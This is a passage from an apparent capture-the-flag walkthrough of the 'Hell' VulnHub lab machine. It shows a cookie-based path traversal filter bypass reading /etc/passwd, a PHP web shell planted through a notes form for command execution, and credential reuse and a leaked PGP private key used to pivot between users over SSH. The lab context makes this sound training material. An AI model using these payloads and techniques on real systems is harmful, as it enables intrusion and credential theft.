   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;server.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;mail.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;users.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;personal.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;notes.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;TR&gt;
   &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Mail Status&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Auth Users&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Personal Folder&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Notes&lt;/H4&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;/CENTRE&gt;
&lt;HTML&gt;
&lt;H3&gt; Email<span style=color:#960050;background-color:#1e0010>&#39;</span>s recieved in the last <span style=color:#ae81ff>24</span> hours: &lt;/H3&gt;2&lt;BR&gt;
&lt;H3&gt; Current Status: Firewall Activated &lt;/H3&gt;&lt;BR&gt;
&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://i.imgur.com/JjipeOj.gif&#34;</span>&gt;
&lt;/HTML&gt;
&lt;/HTML&gt;
</code></pre></div><p>YES. It <strong>does</strong> work! We have the same output added to the <code>panel.php</code> output as we would have if we browsed directly to <code>mail.php</code>. By now the assumption was that the code had something like:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#66d9ef>if</span> ($_COOKIE[<span style=color:#e6db74>&#39;intruder&#39;</span>]) {
   <span style=color:#66d9ef>include</span>($_COOKIE[<span style=color:#e6db74>&#39;intruder&#39;</span>]);
}
</code></pre></div><p>&mldr;with some kind of filtering preventing reading the <code>/etc/passwd</code>. While I was still pretty excited about finding this vuln, I soon came across <a href=https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)#Gray_Box_testing_and_example>this</a> article detailing potential ways of bypassing directory traversal vulnerabilities. After reading this I promptly changed the <code>intruder</code> cookie to <code>....//....//....//....//....//etc/passwd</code> and viola! :)</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# cat cookies
<span style=color:#75715e># Netscape HTTP Cookie File</span>
<span style=color:#75715e># http://curl.haxx.se/rfc/cookie_spec.html</span>
<span style=color:#75715e># This file was generated by libcurl! Edit at your own risk.</span>

192.168.56.102 FALSE /  FALSE <span style=color:#ae81ff>0</span>  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style=color:#ae81ff>0</span>  failcount   <span style=color:#ae81ff>4</span>
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style=color:#ae81ff>0</span>  intruder ....//....//....//....//....//etc/passwd

root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies

&lt;HTML&gt;
&lt;CENTRE&gt;
&lt;H2&gt; Folders &lt;/H2&gt;
&lt;TABLE style<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width:700px&#34;</span> align<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;center&#34;</span>&gt;
&lt;TR&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;server.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;mail.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;users.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;personal.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;notes.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;TR&gt;
   &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Mail Status&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Auth Users&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Personal Folder&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Notes&lt;/H4&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;/CENTRE&gt;
root❌0:0:root:/root:/bin/bash
daemon❌1:1:daemon:/usr/sbin:/bin/sh
bin❌2:2:bin:/bin:/bin/sh
sys❌3:3:sys:/dev:/bin/sh
sync❌4:65534:sync:/bin:/bin/sync
games❌5:60:games:/usr/games:/bin/sh
man❌6:12:man:/var/cache/man:/bin/sh
lp❌7:7:lp:/var/spool/lpd:/bin/sh
mail❌8:8:mail:/var/mail:/bin/sh
news❌9:9:news:/var/spool/news:/bin/sh
uucp❌10:10:uucp:/var/spool/uucp:/bin/sh
proxy❌13:13:proxy:/bin:/bin/sh
www-data❌33:33:www-data:/var/www:/bin/sh
backup❌34:34:backup:/var/backups:/bin/sh
list❌38:38:Mailing List Manager:/var/list:/bin/sh
irc❌39:39:ircd:/var/run/ircd:/bin/sh
gnats❌41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/bin/sh
nobody❌65534:65534:nobody:/nonexistent:/bin/sh
libuuid❌100:101::/var/lib/libuuid:/bin/sh
Debian-exim❌101:104::/var/spool/exim4:/bin/false
statd❌102:65534::/var/lib/nfs:/bin/false
sshd❌103:65534::/var/run/sshd:/usr/sbin/nologin
postgres❌104:108:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
george❌1000:1000:george,,,:/home/george:/bin/bash
mysql❌105:109:MySQL Server,,,:/nonexistent:/bin/false
jack❌1001:1001::/home/jack:/bin/sh
milk_4_life❌1002:1002::/home/milk_4_life:/bin/sh
developers❌1003:1003::/home/developers:/bin/sh
bazza❌1004:1004::/home/bazza:/bin/sh
oj❌1005:1005::/home/oj:/bin/sh
&lt;/HTML&gt;
root@kali:~#
</code></pre></div><p>YEAH. That felt pretty darm good! Obviously not knowing all the steps needed to complete this VM, I figured I had come a pretty long way to finding the pot of gold. (Note the users in this file for later) During the enumeration I took a chance to include <code>/root/flag.txt</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# cat cookies
<span style=color:#75715e># Netscape HTTP Cookie File</span>
<span style=color:#75715e># http://curl.haxx.se/rfc/cookie_spec.html</span>
<span style=color:#75715e># This file was generated by libcurl! Edit at your own risk.</span>

192.168.56.102 FALSE /  FALSE <span style=color:#ae81ff>0</span>  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style=color:#ae81ff>0</span>  failcount   <span style=color:#ae81ff>4</span>
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE <span style=color:#ae81ff>0</span>  intruder ....//....//....//....//....//root/flag.txt

root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies

&lt;HTML&gt;
&lt;CENTRE&gt;
&lt;H2&gt; Folders &lt;/H2&gt;
&lt;TABLE style<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width:700px&#34;</span> align<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;center&#34;</span>&gt;
&lt;TR&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;server.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;mail.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;users.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;personal.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;A HREF<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;notes.php&#34;</span>&gt;&lt;IMG SRC<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;folder.png&#39;</span>&gt;&lt;/A&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;TR&gt;
   &lt;TD&gt;&lt;H4&gt;Server Status&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Mail Status&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Auth Users&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Personal Folder&lt;/H4&gt;&lt;/TD&gt;
   &lt;TD&gt;&lt;H4&gt;Notes&lt;/H4&gt;&lt;/TD&gt;
&lt;/TR&gt;
&lt;/CENTRE&gt;
Congratulations of beating Hell.

I hope you enjoyed it and there weren<span style=color:#960050;background-color:#1e0010>&#39;</span>t to many trolls in here <span style=color:#66d9ef>for</span> you.

Hit me up on irc.freenode.net in <span style=color:#75715e>#vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242</span>

Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de


&lt;/HTML&gt;
root@kali:~#
</code></pre></div><p>And bingo. <em>Technically</em> we finished what the original goal was, though, re-reading the original entry on Vulnhub, I was almost certain this was not the only way to get to this. Maybe a bug on the original release of the VM? I don&rsquo;t know.
From here on onwards, the goal was no longer to read <code>/root/flag.txt</code>. No, we now have to root this VM :)</p>
<h2 id=gaining-shell>gaining shell<a hidden class=anchor aria-hidden=true href=#gaining-shell>#</a></h2>
<p>With the focus slightly shifting, and our ability to read files off the file system, the next natural step was to attempt to get command execution on the VM. Remembering the <code>notes.php</code> file, I decided to try include <code>/tmp/note.txt</code>. This worked just fine and echoed my testing attempts from earlier. So with this information, I simply went back to <code>notes.php</code>, entered: <code>&lt;?php print_r(shell_exec($_GET['c'])); ?></code>, and submitted the form. Next I edited the cookiejar to include <code>/tmp/notes.txt</code>, and proceeded to test my command execution:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c<span style=color:#f92672>=</span>id -c cookies -b cookies
<span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>
&lt;/CENTRE&gt;
uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
&lt;/HTML&gt;
root@kali:~#
</code></pre></div><p>Yay :) With this confirmed working, I modified the command exec request slightly so that commands with potentially strange characters are correctly encoded etc:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo -n “ls -lah” | python -c <span style=color:#e6db74>&#34;import urllib, sys; print urllib.quote(&#39;&#39;.join(sys.stdin));&#34;</span><span style=color:#66d9ef>)</span> -c cookies -b cookies
</code></pre></div><h2 id=becoming-jack>becoming jack<a hidden class=anchor aria-hidden=true href=#becoming-jack>#</a></h2>
<p>With command execution, it was easy to start enumerating as much as possible about the VM. At least as much as the <code>www-data</code> user has access to, which is generally quite a lot.</p>
<p>I looked at the source files for the website out of curiosity about the filtering etc that was going on. I stumbled upon some MySQL credentials in <code>login.php</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#75715e>// mysql_connect(&#34;127.0.0.1&#34;, &#34;Jack&#34;, &#34;zgcR6mU6pX&#34;) or die (&#34;Server Error&#34;); I&#39;ll change this back once development is done. Got sick of typing my password.
</span><span style=color:#75715e></span><span style=color:#a6e22e>mysql_connect</span>(<span style=color:#e6db74>&#34;127.0.0.1&#34;</span>, <span style=color:#e6db74>&#34;www-data&#34;</span>, <span style=color:#e6db74>&#34;website&#34;</span>) <span style=color:#66d9ef>or</span> <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Server Error&#34;</span>);
</code></pre></div><p>The comment was quite helpful along with all the mentions of Jack on the website, along with the <code>/etc/passwd</code> revealing a <code>jack</code> user, I tried these credentials on a SSH session:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# ssh jack@192.168.56.102
jack@192.168.56.102<span style=color:#960050;background-color:#1e0010>&#39;</span>s password:
Linux hell 3.2.0-4-486 <span style=color:#75715e>#1 Debian 3.2.57-3+deb7u2 i686</span>

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms <span style=color:#66d9ef>for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Sun Jul <span style=color:#ae81ff>20</span> 04:29:06 <span style=color:#ae81ff>2014</span> from 192.168.56.1
$ id
uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>jack<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>jack<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>jack<span style=color:#f92672>)</span>
$
</code></pre></div><p>Well that was easy&mldr; With this shell, I also checked out the MySQL database to see if there is any interesting information:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ mysql -uwww-data -pwebsite
Welcome to the MySQL monitor.  Commands end with ; or <span style=color:#ae81ff>\g</span>.
Your MySQL connection id is <span style=color:#ae81ff>10320</span>
Server version: 5.5.37-0+wheezy1 <span style=color:#f92672>(</span>Debian<span style=color:#f92672>)</span>

Copyright <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> 2000, 2014, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span style=color:#e6db74>&#39;help;&#39;</span> or <span style=color:#e6db74>&#39;\h&#39;</span> <span style=color:#66d9ef>for</span> help. Type <span style=color:#e6db74>&#39;\c&#39;</span> to clear the current input statement.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| website            |
+--------------------+
<span style=color:#ae81ff>2</span> rows in set <span style=color:#f92672>(</span>0.00 sec<span style=color:#f92672>)</span>

mysql&gt; use website;
Reading table information <span style=color:#66d9ef>for</span> completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;
+-------------------+
| Tables_in_website |
+-------------------+
| users             |
+-------------------+
<span style=color:#ae81ff>1</span> row in set <span style=color:#f92672>(</span>0.00 sec<span style=color:#f92672>)</span>

mysql&gt; <span style=color:#66d9ef>select</span> * from users;
+----------+-----------+
| username | password  |
+----------+-----------+
| Jack     | g0tmi1k69 |
+----------+-----------+
<span style=color:#ae81ff>1</span> row in set <span style=color:#f92672>(</span>0.00 sec<span style=color:#f92672>)</span>

mysql&gt;
</code></pre></div><p>Alrighty. I made a note about the credentials we have associated with &lsquo;Jack&rsquo; so far. I also tested these credentials on the website, just to get a feel of what the site was actually supposed to do :P</p>
<h2 id=becoming-milk_4_life>becoming milk_4_life<a hidden class=anchor aria-hidden=true href=#becoming-milk_4_life>#</a></h2>
<p>Jack had a <code>.pgp</code> folder with a private key stored in hes home directory.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ pwd
/home/jack/.pgp

$ ls -lah
total 20K
drwx------ <span style=color:#ae81ff>2</span> jack jack 4.0K Jun <span style=color:#ae81ff>18</span> 12:35 .
drwx------ <span style=color:#ae81ff>4</span> jack jack 4.0K Jun <span style=color:#ae81ff>22</span> 18:28 ..
-rwx------ <span style=color:#ae81ff>1</span> jack jack   <span style=color:#ae81ff>39</span> Jun <span style=color:#ae81ff>18</span> 12:35 note
-rwx------ <span style=color:#ae81ff>1</span> jack jack 1.8K Jun <span style=color:#ae81ff>18</span> 12:20 pgp.priv
-rwx------ <span style=color:#ae81ff>1</span> jack jack  <span style=color:#ae81ff>890</span> Jun <span style=color:#ae81ff>18</span> 12:24 pgp.pub

$ cat pgp.priv
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: BCPG C# v1.6.1.0

lQOsBFOg9v8BCACbr++BXlL9e4N6pzcrHkNZGANB7Ii3vHc0Nj37kCm7ZuTMx4LN
bpWrqGb9W9grS9YQ7xSEkBShaKlWMilb4rqrM/tmDyuGt9UozCrVrCTfaZdPl72o
u1QO1DxTT9/iFwlb6AAjTvJGQQx92PQeShEOeTtycH+Xz4tx1ezHpbA4HK9ijftR
lyZy+y9GPSqYLsIU3N8WtnrTJRfSMiU/AGv/GWpykp3tlHjIL0YSHfvUppe4xAil
54J+LN7se3jKuFcRM+i9TF08hsTtM6azl7X4yyEDhHcvWgFY/vyggEwe6/ZP1IKG
zzAWi0sx7tlZLxyr9AFSXLwLvbhUpR3M5rJBABEBAAH/AwMC8ht700SVD+1guMSO
NKMnwLvKkrmW32b/zo/x4g4MbhUs1BXIvHfGw1ArsEpkMucb8utDqGzcwctR00de
jTr/nFo0gKxBMgc34e9HNTI0iFlVYWDFZqU4ie6/Pyt8qvZHOe5Aq0qPsCkcdMME
bR6EQng1ZBXX7zHCF2TobPnIxp5CGI2WUwXmXaGQS/hRriIcAhDx5ZFFqOdVQWES
mLo5Rd205/M4mungbUvwrHayu6ZGume+VXs630YaacNiBFpXnPDfKOCipZ+EhYsz
7febMxXj3mANwLXQfyTZOIXPzMptE11fbDA8jpy9m0vMy5ZCpJnp/VoTaaUxMz45
OeUI9nKTx9P1lGPC9hYidshg3Sg5Iz/qqmL/byAv1bUV2YOdJlAS1XY9Jj/wNrYz
yG9ASw5nfp0ChhLYnnU4dgfEk5bajGvgnhZAlb/+yNvJ5eUcwivjFC8jJUwlrZ+Z
oj1XAC4148JsjcQHW1d7yONc4iI7tSubMNa5GfBal1BxMRLP3nSZ4ICl67gTjrKH
ztiMKAefip3ywnRomfn7q9raJQ8TsKp0+REVy05mhZMZ1AdMlZzhTz8cYy8II6yr
qSxuJARfJ95FGYPrASMfJ+aZfPNk5RDnH5d92vxm/nIWexdayZqqQJG4MzOhtrjx
a0YouqQhxvD2aKslEBJ1S/D4D40xkVI+oaI+aM/6X+XzC2XVJgm7G8FvmtE09BUm
fAMUxE/bgsv33QXsURtelfuoZRLz/OmwybXpwv+Zen0n8hpjQEAOhqD4eieIxH9j
7W6ijInh9XD8jcnUa4eHw7WDa0LPtyQSbPZB1hZou6z8pAZY0LxhmstpPjSYfdKR
HRjhRuu0tdZ2PrKx1wKooo/iiJdZ0Cgizlu4k76rDrQSamFja0Bjb3dsb3ZlcnMu
Y29tiQEcBBABAgAGBQJToPb/AAoJEL26wSU/GKsKnk0H/iWvOGuWwge8VteqxPip
yu2LwvLzjbHAeWwBmsg69h+Yl5l8Y+3B9aoCpnjM2QmMAFHxVA8L6Z4UIyhNJ90Y
l18rYZec9cDUrflowd/A4QVrJNCV/5kCyPeQ03mzGHnlTTvb/qBMymmpVBeP3JoK
vZkGYzFBmrt7q19b3VcvexLTwtLtch8NUOt6719UFRvxE+EXu4JbItr7dSqfYDbh
zHsfGaeU1hCQJg/n83IRxTBsc7h1jIOxraovzbErqpZ6YeYhCK5oo38dJVpz9Daa
quU6lGTizKWX3HS29HQl+PJvzoHyj3T6Aw71BZF4lZNrJmzxHqhVYuRWptioyTWo
tqg<span style=color:#f92672>=</span>
<span style=color:#f92672>=</span>SCkw
-----END PGP PRIVATE KEY BLOCK-----
$
</code></pre></div><p>There was also a note in the directory:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cat note
The usual password as with everything.
</code></pre></div><p>With all this information now known to us, and the fact that I know PGP is pretty popular to encrypt files and sign mail, I figured we had to get this key loaded and decrypt something using it. Further enumeration revealed that <code>/var/mail</code> was world readable:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ pwd
/var/mail/jack/received
$ ls -lah
total 12K
drwxr-sr-x <span style=color:#ae81ff>2</span> root mail 4.0K Jun <span style=color:#ae81ff>18</span> 12:26 .
drwxr-sr-x <span style=color:#ae81ff>3</span> jack jack 4.0K Jul  <span style=color:#ae81ff>5</span> 19:56 ..
-rw-r--r-- <span style=color:#ae81ff>1</span> root mail  <span style=color:#ae81ff>709</span> Jun <span style=color:#ae81ff>18</span> 12:26 message.eml
$ cat message.eml
-----BEGIN PGP MESSAGE-----
Version: BCPG C# v1.6.1.0

hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug<span style=color:#f92672>==</span>
<span style=color:#f92672>=</span>svWU
-----END PGP MESSAGE-----
</code></pre></div><p>I loaded the private GPG key into jacks keyring with:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ gpg --import .pgp/pgp.priv
gpg: keyring <span style=color:#e6db74>`</span>/home/jack/.gnupg/secring.gpg<span style=color:#960050;background-color:#1e0010>&#39;</span> created
gpg: key 3F18AB0A: secret key imported
gpg: key 3F18AB0A: public key <span style=color:#e6db74>&#34;jack@cowlovers.com&#34;</span> imported
gpg: Total number processed: <span style=color:#ae81ff>1</span>
gpg:               imported: <span style=color:#ae81ff>1</span>  <span style=color:#f92672>(</span>RSA: 1<span style=color:#f92672>)</span>
gpg:       secret keys read: <span style=color:#ae81ff>1</span>
gpg:   secret keys imported: <span style=color:#ae81ff>1</span>
</code></pre></div><p>Ofc this doesn’t mean I can actually use it yet, however there was a note about the password, so I could possibly just try all the ones I have found so far for jack. Decrypting the encrypted message we found for jack was as simple as:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ gpg /var/mail/jack/received/message.eml

You need a passphrase to unlock the secret key <span style=color:#66d9ef>for</span>
user: <span style=color:#e6db74>&#34;jack@cowlovers.com&#34;</span>

<span style=color:#75715e># used the password g0tmi1k69 found in the MySQL database</span>

2048-bit RSA key, ID 3F18AB0A, created 2014-06-18

gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
      <span style=color:#e6db74>&#34;jack@cowlovers.com&#34;</span>
gpg: /var/mail/jack/received/message.eml: unknown suffix
Enter new filename <span style=color:#f92672>[</span>text.txt<span style=color:#f92672>]</span>:
gpg: WARNING: message was not integrity protected

$ cat text.txt
Ok Jack. I<span style=color:#e6db74>&#39;ve created the account &#39;</span>milk_4_life<span style=color:#e6db74>&#39; as per your request. Please stop emailing me about this now or I&#39;</span>m going to talk to HR like we discussed.

The password is <span style=color:#e6db74>&#39;4J0WWvL5nS&#39;</span>
</code></pre></div><p>So, lets ssh in as <code>milk_4_life</code>&mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# ssh milk_4_life@192.168.56.102
milk_4_life@192.168.56.102<span style=color:#960050;background-color:#1e0010>&#39;</span>s password:
Linux hell 3.2.0-4-486 <span style=color:#75715e>#1 Debian 3.2.57-3+deb7u2 i686</span>

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms <span style=color:#66d9ef>for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ id
uid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>milk_4_life<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>milk_4_life<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>milk_4_life<span style=color:#f92672>)</span>
</code></pre></div><p>Easy :D</p>
<h2 id=becoming-george>becoming george<a hidden class=anchor aria-hidden=true href=#becoming-george>#</a></h2>
<p>The user <code>milk_4_life</code> has a <code>game</code> in hes home folder.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ls -lah game
---s--x--x <span style=color:#ae81ff>1</span> george george 5.7K Jun <span style=color:#ae81ff>19</span> 18:24 game

$ ./game
I<span style=color:#960050;background-color:#1e0010>&#39;</span>m listening
</code></pre></div><p>Not a very interesting game thus far. I decided to quit and rerun the game, this time backgrounding it with <code>&</code>. At this stage I wanted to run a netstat to see if it is <em>listening</em> on a port or something, but the netstat command was not available. I figured I could cause a error as the same port can not be opened twice. So, with <code>./game &</code> already running, another instance of <code>./game</code> errored out, revealing the listening port:</p>
